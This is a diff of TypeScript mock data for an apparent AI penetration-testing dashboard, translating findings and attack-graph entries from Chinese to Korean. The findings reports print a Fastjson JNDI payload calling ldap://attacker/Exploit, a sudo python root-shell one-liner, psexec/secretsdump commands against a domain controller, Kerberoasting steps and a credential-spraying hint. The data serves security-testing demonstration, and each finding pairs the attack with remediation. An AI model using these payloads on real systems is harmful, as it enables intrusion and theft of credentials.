@@ -655,8 +655,8 @@ export const findings: Finding[] = [
     vulnclass: "Default Credentials",
     severity: "high",
     status: "pending",
-    summary: "admin.acme.com 后台默认口令 admin/admin123",
-    evidence: "登录成功，进入管理后台，可管理用户与订单。",
+    summary: "admin.acme.com 관리자 기본 비밀번호 admin/admin123",
+    evidence: "로그인에 성공하여 관리자 시스템에 진입했으며 사용자와 주문을 관리할 수 있음.",
     intent_id: "i-3",
     task_id: "t-acme-web",
     task_description: "Acme 공식 웹사이트 및 관리자 시스템 외부 침투 테스트",
@@ -668,8 +668,8 @@ export const findings: Finding[] = [
     vulnclass: "Open Redirect",
     severity: "low",
     status: "pending",
-    summary: "登录后 next 参数任意跳转",
-    evidence: "/login?next=https://evil.example 登录后 302 跳到外站。",
+    summary: "로그인 후 next 매개변수에 의한 임의 리디렉션",
+    evidence: "/login?next=https://evil.example에서 로그인 후 302로 외부 사이트로 이동함.",
     task_id: "t-acme-web",
     task_description: "Acme 공식 웹사이트 및 관리자 시스템 외부 침투 테스트",
     ts: T("2026-07-25T19:12:00Z"),
@@ -680,8 +680,8 @@ export const findings: Finding[] = [
     vulnclass: "Missing Rate Limit",
     severity: "medium",
     status: "pending",
-    summary: "登录接口无速率限制，可暴力破解",
-    evidence: "1000 次/分钟无锁定，无验证码。",
+    summary: "로그인 인터페이스에 요청 속도 제한이 없어 무차별 대입 가능",
+    evidence: "분당 1000회 요청에도 잠금 및 CAPTCHA 없음.",
     task_id: "t-acme-web",
     task_description: "Acme 공식 웹사이트 및 관리자 시스템 외부 침투 테스트",
     ts: T("2026-07-25T18:40:00Z"),
@@ -692,8 +692,8 @@ export const findings: Finding[] = [
     vulnclass: "Verbose Error",
     severity: "low",
     status: "pending",
-    summary: "API 500 返回堆栈，泄露路径与框架版本",
-    evidence: "触发 500 返回 Node.js 堆栈，泄露绝对路径与依赖版本。",
+    summary: "API 500 응답에 스택이 포함되어 경로와 프레임워크 버전 노출",
+    evidence: "500 오류를 유발하면 Node.js 스택을 반환하여 절대 경로와 의존성 버전이 노출됨.",
     task_id: "t-acme-api",
     task_description: "api.acme.com 권한 우회 및 인젝션 테스트",
     ts: T("2026-07-25T23:05:00Z"),
@@ -704,8 +704,8 @@ export const findings: Finding[] = [
     vulnclass: "Outdated Component",
     severity: "medium",
     status: "pending",
-    summary: "shop 使用存在已知 RCE 的老版本组件",
-    evidence: "指纹识别到组件 v2.3.1，对应 CVE-2024-xxxx 反序列化 RCE。",
+    summary: "shop이 알려진 RCE가 있는 이전 버전의 구성 요소를 사용함",
+    evidence: "지문 분석에서 구성 요소 v2.3.1을 식별했으며 CVE-2024-xxxx 역직렬화 RCE에 해당함.",
     task_id: "t-shop-pay",
     task_description: "shop.acme.com 결제 및 주문 흐름",
     ts: T("2026-07-23T15:00:00Z"),
@@ -716,8 +716,8 @@ export const findings: Finding[] = [
     vulnclass: "Hardcoded Credentials",
     severity: "high",
     status: "pending",
-    summary: "泄露源码中硬编码数据库凭据 sa/Acme@2021",
-    evidence: "git-dumper 还原 www.acme.com/.git 得到 config.php，内含明文 DB 口令，后续被证实可在内网复用。",
+    summary: "노출된 소스 코드에 데이터베이스 자격 증명 sa/Acme@2021이 하드코딩됨",
+    evidence: "git-dumper로 www.acme.com/.git을 복원하여 config.php를 확보했으며 평문 DB 비밀번호가 포함됨. 이후 내부망에서도 재사용 가능함을 확인함.",
     intent_id: "ig",
     task_id: "t-acme-web",
     task_description: "Acme 공식 웹사이트 및 관리자 시스템 외부 침투 테스트",
@@ -727,14 +727,14 @@ export const findings: Finding[] = [
     id: "f-12",
     assets: [assetRef(4)],
     vulnclass: "Deserialization RCE",
-    name: "shop 商城 Fastjson 反序列化远程命令执行",
+    name: "shop 쇼핑몰 Fastjson 역직렬화 원격 명령 실행",
     severity: "critical",
     status: "confirmed",
     report:
-      '## 漏洞概述\n\n`shop.acme.com` 的 `/api/import` 接口使用 **Fastjson 1.2.24** 解析用户可控 JSON，未开启 `safeMode`，可通过 `@type` 指定任意类触发 **JNDI 注入 → 远程命令执行**。\n\n## 影响\n\n- 攻击者无需认证即可在 DMZ Web 服务器上执行任意命令（`www-data@dmz-web01`）\n- 结合后续提权，成为进入内网的跳板\n\n## 复现步骤\n\n1. 构造 JNDI payload：\n\n```json\n{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}\n```\n\n2. `POST /api/import`，`Content-Type: application/json`\n3. 目标回连 dnslog，落地反弹 shell\n\n## 修复建议\n\n- 升级 Fastjson 至 **1.2.83+** 并开启 `safeMode`\n- `/api/import` 增加鉴权与来源校验\n- 出网限制：禁止业务服务器主动外联 LDAP/RMI\n',
-    summary: "shop.acme.com Fastjson 1.2.24 反序列化远程命令执行",
+      '## 취약점 개요\n\n`shop.acme.com`의 `/api/import` 인터페이스는 **Fastjson 1.2.24**로 사용자가 제어하는 JSON을 파싱하며 `safeMode`가 꺼져 있습니다. `@type`으로 임의의 클래스를 지정하여 **JNDI 인젝션 → 원격 명령 실행**을 유발할 수 있습니다.\n\n## 영향\n\n- 인증 없이 DMZ 웹 서버에서 임의의 명령 실행 가능(`www-data@dmz-web01`)\n- 이후 권한 상승과 결합하여 내부망 진입 경유점으로 사용 가능\n\n## 재현 단계\n\n1. JNDI 페이로드 구성:\n\n```json\n{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}\n```\n\n2. `POST /api/import`, `Content-Type: application/json`\n3. 대상이 dnslog로 역방향 연결하며 리버스 셸이 실행됨\n\n## 수정 권고\n\n- Fastjson을 **1.2.83+**로 업그레이드하고 `safeMode` 활성화\n- `/api/import`에 인증 및 출처 검사 추가\n- 외부 연결 제한: 업무 서버의 LDAP/RMI 외부 연결 금지\n',
+    summary: "shop.acme.com Fastjson 1.2.24 역직렬화 원격 명령 실행",
     evidence:
-      "POST /api/import 提交 JNDI payload（@type:JdbcRowSetImpl）→ 回连 dnslog 并落地反弹 shell（www-data@dmz-web01）。",
+      "POST /api/import로 JNDI 페이로드(@type:JdbcRowSetImpl)를 제출 → dnslog 역방향 연결 및 리버스 셸 실행(www-data@dmz-web01).",
     intent_id: "i7",
     task_id: "t-acme-web",
     task_description: "Acme 공식 웹사이트 및 관리자 시스템 외부 침투 테스트",
@@ -746,9 +746,9 @@ export const findings: Finding[] = [
     vulnclass: "Privilege Escalation",
     severity: "high",
     status: "pending",
-    summary: "DMZ 立足点 sudo NOPASSWD 错配可本地提权 root",
+    summary: "DMZ 거점의 sudo NOPASSWD 설정 오류로 로컬 root 권한 상승 가능",
     evidence:
-      "sudo -l 显示 (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")' 直接拿 root。",
+      "sudo -l에 (ALL) NOPASSWD: /usr/bin/python3 표시 → sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")'로 바로 root 확보.",
     intent_id: "i8",
     task_id: "t-acme-web",
     task_description: "Acme 공식 웹사이트 및 관리자 시스템 외부 침투 테스트",
@@ -760,8 +760,8 @@ export const findings: Finding[] = [
     vulnclass: "Network Segmentation",
     severity: "medium",
     status: "pending",
-    summary: "DMZ 主机双网卡直连内网，边界隔离失效",
-    evidence: "dmz-web01 第二网卡在 10.10.10.0/24，可从 DMZ 直达域控/文件服务器/Jenkins，越过网络分区。",
+    summary: "DMZ 호스트의 두 네트워크 인터페이스가 내부망에 직접 연결되어 경계 격리 무효화",
+    evidence: "dmz-web01의 두 번째 네트워크 인터페이스가 10.10.10.0/24에 있어 DMZ에서 도메인 컨트롤러/파일 서버/Jenkins로 직접 접근하여 네트워크 분리를 넘을 수 있음.",
     intent_id: "i9",
     task_id: "t-acme-web",
     task_description: "Acme 공식 웹사이트 및 관리자 시스템 외부 침투 테스트",
@@ -773,9 +773,9 @@ export const findings: Finding[] = [
     vulnclass: "Unauthenticated RCE",
     severity: "high",
     status: "pending",
-    summary: "内部 Jenkins 未授权 Script Console 远程命令执行",
+    summary: "내부 Jenkins의 인증 없는 Script Console 원격 명령 실행",
     evidence:
-      "GET /script 无需登录即可执行 Groovy：'whoami'.execute().text → SYSTEM；并从凭据库导出域账号 acme\\svc_deploy。",
+      "GET /script에서 로그인 없이 Groovy 실행 가능: 'whoami'.execute().text → SYSTEM. 자격 증명 저장소에서 도메인 계정 acme\\svc_deploy도 추출함.",
     intent_id: "i11",
     task_id: "t-acme-web",
     task_description: "Acme 공식 웹사이트 및 관리자 시스템 외부 침투 테스트",
@@ -787,8 +787,8 @@ export const findings: Finding[] = [
     vulnclass: "Kerberoasting",
     severity: "high",
     status: "pending",
-    summary: "域服务账号 svc_sql 可被 Kerberoast 且口令弱",
-    evidence: "GetUserSPNs 请求 svc_sql 的 TGS，hashcat -m 13100 离线破出 Sql@2020，该账号属于 SQL 管理组。",
+    summary: "도메인 서비스 계정 svc_sql이 Kerberoasting에 취약하고 비밀번호도 약함",
+    evidence: "GetUserSPNs로 svc_sql의 TGS를 요청하고 hashcat -m 13100으로 오프라인 해독하여 Sql@2020을 확보함. 해당 계정은 SQL 관리 그룹에 속함.",
     intent_id: "i12",
     task_id: "t-acme-web",
     task_description: "Acme 공식 웹사이트 및 관리자 시스템 외부 침투 테스트",
@@ -798,14 +798,14 @@ export const findings: Finding[] = [
     id: "f-17",
     assets: [assetRef(20)],
     vulnclass: "Domain Compromise",
-    name: "内网域控 DC01 完全控制（Domain Admin）",
+    name: "내부망 도메인 컨트롤러 DC01 완전 제어(Domain Admin)",
     severity: "critical",
     status: "confirmed",
     report:
-      "## 漏洞概述\n\n经外网 Fastjson RCE 立足 DMZ，再由 sudo 提权、双网卡穿透、Jenkins 未授权 RCE 拿到域账号 `svc_deploy`；该账号属于 **Domain Admins**，最终完全控制域控 **DC01**。\n\n## 影响\n\n- 取得域管理员权限，可控制全域主机与账号\n- `secretsdump` 导出全域 NTLM 哈希（含 `krbtgt`），可制作黄金票据长期潜伏\n- 内部靶标达成\n\n## 复现步骤\n\n1. 以 `svc_deploy` 登录并导出哈希：\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. 获得 DC01 的 SYSTEM 权限，导出域内全部哈希\n\n## 修复建议\n\n- 收敛服务账号权限，移出 Domain Admins，落实分层管理（tiering）\n- 连续两次重置 `krbtgt`，轮换服务账号强口令\n- 修复 DMZ→内网边界隔离与前述 RCE/提权链\n",
-    summary: "拿下域控 DC01（Domain Admin）—— 内部靶标达成",
+      "## 취약점 개요\n\n외부망 Fastjson RCE로 DMZ 거점을 확보한 뒤 sudo 권한 상승, 이중 네트워크 인터페이스 경유, Jenkins 인증 없는 RCE를 통해 도메인 계정 `svc_deploy`를 확보했습니다. 이 계정은 **Domain Admins**에 속하여 최종적으로 도메인 컨트롤러 **DC01**을 완전히 제어했습니다.\n\n## 영향\n\n- 도메인 관리자 권한으로 전체 도메인의 호스트와 계정 제어 가능\n- `secretsdump`로 전체 도메인 NTLM 해시(`krbtgt` 포함)를 추출하여 골든 티켓을 통한 장기 잠복 가능\n- 내부 테스트 목표 달성\n\n## 재현 단계\n\n1. `svc_deploy`로 로그인하여 해시 추출:\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. DC01의 SYSTEM 권한을 확보하고 도메인의 모든 해시 추출\n\n## 수정 권고\n\n- 서비스 계정 권한 축소, Domain Admins에서 제거하고 계층별 관리(tiering) 적용\n- `krbtgt`를 연속 두 차례 재설정하고 서비스 계정의 강력한 비밀번호 교체\n- DMZ→내부망 경계 격리 및 앞선 RCE/권한 상승 경로 수정\n",
+    summary: "도메인 컨트롤러 DC01 확보(Domain Admin) — 내부 테스트 목표 달성",
     evidence:
-      "svc_deploy 属于 Domain Admins，psexec.py 以其登录 DC01 得 SYSTEM，secretsdump 导出全域 NTLM 哈希（含 krbtgt），完成靶标控制。",
+      "svc_deploy가 Domain Admins에 속하므로 psexec.py로 DC01에 로그인하여 SYSTEM을 확보함. secretsdump로 전체 도메인 NTLM 해시(krbtgt 포함)를 추출하여 대상 제어를 완료함.",
     intent_id: "i13",
     task_id: "t-acme-web",
     task_description: "Acme 공식 웹사이트 및 관리자 시스템 외부 침투 테스트",
@@ -824,7 +824,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "root",
       type: "fact",
-      payload: P({ summary: "根：acme.com 外网→内网纵深渗透" }),
+      payload: P({ summary: "루트: acme.com 외부망→내부망 심층 침투 테스트" }),
       priority: 0,
       state: "origin",
       origin: "system",
@@ -835,7 +835,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "g1",
       type: "goal",
-      payload: P({ text: "获取 acme.com 后台管理权限" }),
+      payload: P({ text: "acme.com 관리자 권한 확보" }),
       priority: 9,
       state: "met",
       origin: "goals",
@@ -844,7 +844,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "g2",
       type: "goal",
-      payload: P({ text: "读取用户敏感数据" }),
+      payload: P({ text: "사용자의 민감한 데이터 읽기" }),
       priority: 8,
       state: "open",
       origin: "goals",
@@ -853,7 +853,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "g3",
       type: "goal",
-      payload: P({ text: "从外网突破 DMZ，建立内网立足点" }),
+      payload: P({ text: "외부망에서 DMZ를 통과하여 내부망 거점 확보" }),
       priority: 9,
       state: "met",
       origin: "goals",
@@ -862,7 +862,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "g4",
       type: "goal",
-      payload: P({ text: "内网横向，拿下内部靶标域控 DC01" }),
+      payload: P({ text: "내부망 수평 이동으로 내부 테스트 대상인 도메인 컨트롤러 DC01 확보" }),
       priority: 10,
       state: "met",
       origin: "goals",
@@ -873,7 +873,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i1",
       type: "intent",
-      payload: P({ summary: "acme.com 子域枚举与端口扫描" }),
+      payload: P({ summary: "acme.com 하위 도메인 열거 및 포트 스캔" }),
       priority: 6,
       state: "done",
       origin: "planner",
@@ -882,7 +882,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i2",
       type: "intent",
-      payload: P({ summary: "admin 后台默认口令 / 弱口令测试" }),
+      payload: P({ summary: "관리자 시스템 기본 비밀번호 / 약한 비밀번호 테스트" }),
       priority: 9,
       state: "done",
       origin: "planner",
@@ -891,7 +891,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i3",
       type: "intent",
-      payload: P({ summary: "枚举后台功能与用户数据接口" }),
+      payload: P({ summary: "관리자 기능 및 사용자 데이터 인터페이스 열거" }),
       priority: 8,
       state: "running",
       origin: "planner",
@@ -900,7 +900,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i4",
       type: "intent",
-      payload: P({ summary: "www.acme.com/search 页 SQL 注入探测" }),
+      payload: P({ summary: "www.acme.com/search 페이지 SQL 인젝션 탐지" }),
       priority: 8,
       state: "done",
       origin: "planner",
@@ -909,7 +909,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i5",
       type: "intent",
-      payload: P({ summary: "api.acme.com 订单接口越权(IDOR)测试" }),
+      payload: P({ summary: "api.acme.com 주문 인터페이스 권한 우회(IDOR) 테스트" }),
       priority: 8,
       state: "running",
       origin: "planner",
@@ -918,7 +918,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "ig",
       type: "intent",
-      payload: P({ summary: "www.acme.com .git 源码泄露与硬编码凭据提取" }),
+      payload: P({ summary: "www.acme.com .git 소스 코드 노출 및 하드코딩된 자격 증명 추출" }),
       priority: 7,
       state: "done",
       origin: "planner",
@@ -929,7 +929,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i6",
       type: "intent",
-      payload: P({ summary: "shop.acme.com 组件指纹识别与 CVE 关联" }),
+      payload: P({ summary: "shop.acme.com 구성 요소 지문 식별 및 CVE 연결" }),
       priority: 7,
       state: "done",
       origin: "planner",
@@ -938,7 +938,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i7",
       type: "intent",
-      payload: P({ summary: "触发 shop 反序列化 RCE，获取反弹 shell" }),
+      payload: P({ summary: "shop 역직렬화 RCE를 유발하여 리버스 셸 확보" }),
       priority: 9,
       state: "done",
       origin: "planner",
@@ -947,7 +947,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i8",
       type: "intent",
-      payload: P({ summary: "DMZ 立足点本地信息收集与提权至 root" }),
+      payload: P({ summary: "DMZ 거점의 로컬 정보 수집 및 root 권한 상승" }),
       priority: 8,
       state: "done",
       origin: "planner",
@@ -958,7 +958,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i9",
       type: "intent",
-      payload: P({ summary: "以立足点为 pivot 做内网主机发现" }),
+      payload: P({ summary: "거점을 경유하여 내부망 호스트 탐색" }),
       priority: 8,
       state: "done",
       origin: "planner",
@@ -967,7 +967,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i10",
       type: "intent",
-      payload: P({ summary: "内网凭据复用与密码喷洒" }),
+      payload: P({ summary: "내부망 자격 증명 재사용 및 비밀번호 스프레이" }),
       priority: 8,
       state: "running",
       origin: "planner",
@@ -976,7 +976,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i11",
       type: "intent",
-      payload: P({ summary: "内部 Jenkins 未授权 Groovy 脚本执行(RCE)" }),
+      payload: P({ summary: "내부 Jenkins의 인증 없는 Groovy 스크립트 실행(RCE)" }),
       priority: 9,
       state: "done",
       origin: "planner",
@@ -985,7 +985,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i12",
       type: "intent",
-      payload: P({ summary: "对域服务账号做 Kerberoasting 并离线破解" }),
+      payload: P({ summary: "도메인 서비스 계정에 Kerberoasting 수행 및 오프라인 해독" }),
       priority: 8,
       state: "done",
       origin: "planner",
@@ -994,7 +994,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i13",
       type: "intent",
-      payload: P({ summary: "用域管理员凭据登录并控制域控 DC01" }),
+      payload: P({ summary: "도메인 관리자 자격 증명으로 DC01에 로그인하여 제어" }),
       priority: 10,
       state: "done",
       origin: "planner",
@@ -1005,7 +1005,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa1",
       type: "fact",
-      payload: P({ summary: "发现子域 admin.acme.com（Element-UI 后台）" }),
+      payload: P({ summary: "하위 도메인 admin.acme.com 발견(Element-UI 관리자 시스템)" }),
       priority: 0,
       state: "open",
       origin: "work#1",
@@ -1014,7 +1014,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa2",
       type: "fact",
-      payload: P({ summary: "search 页 q 参数为 error-based 注入点(MSSQL)" }),
+      payload: P({ summary: "search 페이지의 q 매개변수가 오류 기반 인젝션 지점(MSSQL)" }),
       priority: 0,
       state: "open",
       origin: "work#4",
@@ -1023,7 +1023,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "faGit",
       type: "fact",
-      payload: P({ summary: ".git 可下载，git-dumper 还原出后端源码" }),
+      payload: P({ summary: ".git을 다운로드할 수 있으며 git-dumper로 백엔드 소스 복원" }),
       priority: 0,
       state: "open",
       origin: "workG",
@@ -1032,7 +1032,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "faCreds",
       type: "fact",
-      payload: P({ summary: "源码 config.php 硬编码 DB 口令 sa / Acme@2021（疑似内网通用）" }),
+      payload: P({ summary: "소스 config.php에 DB 비밀번호 sa / Acme@2021 하드코딩(내부망 공용으로 추정)" }),
       priority: 0,
       state: "open",
       origin: "workG",
@@ -1041,7 +1041,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa3",
       type: "fact",
-      payload: P({ summary: "shop 指纹命中 Fastjson 1.2.24（存在已知反序列化 RCE）" }),
+      payload: P({ summary: "shop의 지문이 Fastjson 1.2.24와 일치(알려진 역직렬화 RCE 존재)" }),
       priority: 0,
       state: "open",
       origin: "work#6",
@@ -1050,7 +1050,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa4",
       type: "fact",
-      payload: P({ summary: "反弹 shell 成功：www-data@dmz-web01(10.0.20.15)，位于 DMZ 段" }),
+      payload: P({ summary: "리버스 셸 성공: DMZ 대역의 www-data@dmz-web01(10.0.20.15)" }),
       priority: 0,
       state: "open",
       origin: "work#7",
@@ -1059,7 +1059,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa5",
       type: "fact",
-      payload: P({ summary: "sudo -l：(ALL) NOPASSWD: /usr/bin/python3 → 可提权 root" }),
+      payload: P({ summary: "sudo -l: (ALL) NOPASSWD: /usr/bin/python3 → root 권한 상승 가능" }),
       priority: 0,
       state: "open",
       origin: "work#8",
@@ -1068,7 +1068,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa6",
       type: "fact",
-      payload: P({ summary: "立足点第二网卡直连内网 10.10.10.0/24（跨越 DMZ 边界）" }),
+      payload: P({ summary: "거점의 두 번째 네트워크 인터페이스가 내부망 10.10.10.0/24에 직접 연결됨(DMZ 경계 통과)" }),
       priority: 0,
       state: "open",
       origin: "work#9",
@@ -1077,7 +1077,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa7",
       type: "fact",
-      payload: P({ summary: "内网存活：10.10.10.10 DC01(域控) / 10.10.10.5 FS01(SMB) / 10.10.10.20 JENKINS" }),
+      payload: P({ summary: "내부망 활성 호스트: 10.10.10.10 DC01(도메인 컨트롤러) / 10.10.10.5 FS01(SMB) / 10.10.10.20 JENKINS" }),
       priority: 0,
       state: "open",
       origin: "work#9",
@@ -1086,7 +1086,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa8",
       type: "fact",
-      payload: P({ summary: "JENKINS 控制台 /script 无鉴权，可直接执行 Groovy" }),
+      payload: P({ summary: "JENKINS 콘솔 /script에 인증이 없어 Groovy를 직접 실행할 수 있음" }),
       priority: 0,
       state: "open",
       origin: "work#11",
@@ -1095,7 +1095,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa9",
       type: "fact",
-      payload: P({ summary: "从 Jenkins 凭据库导出域账号 acme\\svc_deploy 明文口令" }),
+      payload: P({ summary: "Jenkins 자격 증명 저장소에서 도메인 계정 acme\\svc_deploy의 평문 비밀번호 추출" }),
       priority: 0,
       state: "open",
       origin: "work#11",
@@ -1104,7 +1104,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa10",
       type: "fact",
-      payload: P({ summary: "Kerberoast 到 svc_sql 的 TGS，hashcat 破出口令 Sql@2020" }),
+      payload: P({ summary: "svc_sql의 TGS를 Kerberoasting으로 확보하고 hashcat으로 Sql@2020 해독" }),
       priority: 0,
       state: "open",
       origin: "work#12",
@@ -1115,7 +1115,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fi1",
       type: "finding",
-      payload: P({ summary: "后台默认口令 admin/admin123" }),
+      payload: P({ summary: "관리자 기본 비밀번호 admin/admin123" }),
       priority: 0,
       state: "confirmed",
       origin: "work#2",
@@ -1124,7 +1124,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fi2",
       type: "finding",
-      payload: P({ summary: "SQL 注入（search q）可读 acme_prod 库" }),
+      payload: P({ summary: "SQL 인젝션(search q)으로 acme_prod 데이터베이스 읽기 가능" }),
       priority: 0,
       state: "confirmed",
       origin: "work#4",
@@ -1133,7 +1133,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fi3",
       type: "finding",
-      payload: P({ summary: "IDOR：/v1/orders?id= 可越权读他人订单" }),
+      payload: P({ summary: "IDOR: /v1/orders?id=로 다른 사용자의 주문에 무단 접근 가능" }),
       priority: 0,
       state: "confirmed",
       origin: "work#5",
@@ -1142,7 +1142,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiSrc",
       type: "finding",
-      payload: P({ summary: "源码泄露 + 硬编码数据库凭据（sa/Acme@2021）" }),
+      payload: P({ summary: "소스 코드 노출 + 하드코딩된 데이터베이스 자격 증명(sa/Acme@2021)" }),
       priority: 0,
       state: "confirmed",
       origin: "workG",
@@ -1151,7 +1151,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiRce",
       type: "finding",
-      payload: P({ summary: "shop Fastjson 反序列化 RCE，获得服务器命令执行" }),
+      payload: P({ summary: "shop Fastjson 역직렬화 RCE로 서버 명령 실행 확보" }),
       priority: 0,
       state: "confirmed",
       origin: "work#7",
@@ -1160,7 +1160,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiPriv",
       type: "finding",
-      payload: P({ summary: "DMZ 立足点本地提权至 root（sudo NOPASSWD 错配）" }),
+      payload: P({ summary: "DMZ 거점에서 로컬 root 권한 상승(sudo NOPASSWD 설정 오류)" }),
       priority: 0,
       state: "confirmed",
       origin: "work#8",
@@ -1169,7 +1169,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiJenkins",
       type: "finding",
-      payload: P({ summary: "内部 Jenkins 未授权 Groovy → 服务器 RCE" }),
+      payload: P({ summary: "내부 Jenkins 인증 없는 Groovy → 서버 RCE" }),
       priority: 0,
       state: "confirmed",
       origin: "work#11",
@@ -1178,7 +1178,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiKerb",
       type: "finding",
-      payload: P({ summary: "Kerberoasting 破解域服务账号 svc_sql 口令" }),
+      payload: P({ summary: "Kerberoasting으로 도메인 서비스 계정 svc_sql의 비밀번호 해독" }),
       priority: 0,
       state: "confirmed",
       origin: "work#12",
@@ -1187,7 +1187,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiDC",
       type: "finding",
-      payload: P({ summary: "拿下域控 DC01（Domain Admin）—— 内部靶标达成" }),
+      payload: P({ summary: "도메인 컨트롤러 DC01 확보(Domain Admin) — 내부 테스트 목표 달성" }),
       priority: 0,
       state: "confirmed",
       origin: "work#13",
@@ -1198,7 +1198,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "h1",
       type: "hint",
-      payload: P({ summary: "后台是 Element-UI，优先跑默认口令表" }),
+      payload: P({ summary: "관리자 시스템이 Element-UI이므로 기본 비밀번호 목록부터 테스트" }),
       priority: 5,
       state: "consumed",
       origin: "mainagent",
@@ -1207,7 +1207,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "h2",
       type: "hint",
-      payload: P({ summary: "内网优先打 Jenkins：未授权 /script 直接 Groovy RCE" }),
+      payload: P({ summary: "내부망에서는 Jenkins 우선: 인증 없는 /script에서 직접 Groovy RCE" }),
       priority: 6,
       state: "consumed",
       origin: "mainagent",
@@ -1216,7 +1216,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "h3",
       type: "hint",
-      payload: P({ summary: "源码里那组 DB 口令拿去内网喷洒，大概率通用" }),
+      payload: P({ summary: "소스의 DB 비밀번호를 내부망 스프레이에 사용. 공용일 가능성이 높음" }),
       priority: 6,
       state: "consumed",
       origin: "mainagent",
@@ -1298,14 +1298,14 @@ export const frontier: TaskNode[] = explorationGraph.nodes.filter(
 export const activity: Activity[] = [
   // planner —— 每轮完整决策链：读态势 → 拉 worker 产出对照 → 判目标 → add_intent 派方向
   // ── 第 0 轮 · 目标拆解与首批意图（2026-07-24 09:12）──
-  { seq: 1000, worker: "planner", ts: T("2026-07-24T09:12:10Z"), kind: "round", summary: "第 0 轮 · 目标拆解" },
+  { seq: 1000, worker: "planner", ts: T("2026-07-24T09:12:10Z"), kind: "round", summary: "0번째 턴 · 목표 분해" },
   {
     seq: 1001,
     worker: "planner",
     ts: T("2026-07-24T09:12:25Z"),
     kind: "thinking",
     summary:
-      "graph_overview：goals 已由目标层拆好——g1「获取 acme.com 后台管理权限」、g2「读取用户敏感数据」，均 open；facts=0、recent_facts 为空（图基本空白，还没有任何 worker 产出）。范围内资产只有根域 acme.com + 一个 C 段。攻击面初判：www / admin / api / shop / vpn 五个入口。图里没有 fact，我只能做【极轻量只读探测】把初始意图说具体，绝不在 plan 里把活干了。",
